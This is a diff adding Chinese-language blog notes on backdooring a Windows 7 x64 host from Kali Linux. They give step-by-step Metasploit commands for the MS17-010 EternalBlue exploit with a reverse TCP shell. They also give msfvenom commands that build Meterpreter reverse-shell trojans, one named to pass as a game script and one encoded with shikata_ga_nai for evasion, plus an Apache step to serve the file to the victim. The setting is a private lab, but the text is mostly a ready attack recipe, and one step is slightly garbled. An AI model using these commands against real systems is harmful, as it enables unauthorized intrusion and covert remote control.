@@ -1,0 +1,118 @@
+[Kali Linux： Windows7 x64 植入后门_m0_50917178的博客-CSDN博客](https://blog.csdn.net/m0_50917178/article/details/115588279)
+
+
+
+#### 网络侦察（网络扫描）
+
+工具：nmap、nessus 
+
+nmap -sP 192.168.x.103/24          #扫描网段
+
+nmap -A -v 192.168.x.103             #正式扫描某一主机
+
+
+
+
+
+#### 漏洞利用
+
+漏洞：永恒之蓝漏洞、SMB漏洞      #139、445端口
+
+工具：msf（瑞士军刀）  			#  show options   # 显示配置
+
+msfconsole									#msf启动 
+
+use     +      模块								#使用模块    
+
+   
+
+1） search name:ms17-010 type:auxiliary         #查找模块 可有可没有
+
+2） use auxiliary/scanner/smb/smb_ms17_010     #使用这个模块
+
+3） run    
+
+4）  back
+
+5）  search ms17-010 type:exploit    # 查找  可有可没有
+
+6）  use exploit/windows/smb/ms17_010_eternalblue    #使用这个模块
+
+7）  set rhosts 192.168.x.103   #设置目的IP
+
+8）  search type:payload windows/x64/shell      #查找模块  可有可无
+
+9）  use payload/windows/x64/shell/reverse_tcp    #使用载荷模板
+
+10）show options                               		  #查看该模板参数
+
+​		set lhost 192.168.128.146                    #设置主机ip地址
+
+​		back                                       				  *#退出该模块* use 
+
+11） exploit/windows/smb/ms17_010_eternablue  #使用渗透模块
+
+
+
+https://blog.csdn.net/m0_50897139/article/details/114367874
+
+
+
+#### 暴力破解（弱口令攻击）
+
+工具：hydra（九头蛇）、美杜莎
+
+枚举效率较低、实战需要好一点的字典
+
+
+
+#### 特洛伊木马植入
+
+工具：msfvenom
+
+1）msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.x.198 LPORT=5555 -f exe > games_Script.exe
+
+2） service apache2 start     # apache2 是web服务器   即内网网站服务器  让靶机可以访问  并且下载我们生成的木马
+
+3） msfconsole                //启动
+
+4） use exploit/multi/handler //加载模块 
+
+5） set payload windows/meterpreter/reverse_tcp    				//选择Payload 
+
+6） set lhost 192.168.x.198  				//这里的地址设置成我们刚才生成木马的IP地址 
+
+7） set lport 9999           			//这里的端口设置成刚才我们生成木马所监听的端口 
+
+8） exploit                  			//开始执行漏洞，开始监听,等待 Win 7主机上线
+
+https://www.daimajiaoliu.com/daima/476249941900409
+
+msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b '0x00' LHOST=172.16.66.128 LPORT=5555 -f exe >pink.exe
+
+
+
+#### SQL注入
+
+工具：xampp + sqli-labs
+
+
+
+PHP + Mysql 
+
+#### Web网站攻击
+
+
+
+https://www.bbsmax.com/A/gGdX7wQQ54/
+
+http://www.apachefriends.org/zh_cn/xampp.html
+
+https://www.wlhhlc.top/posts/46463/
+
+
+
+#### 
+
+
+
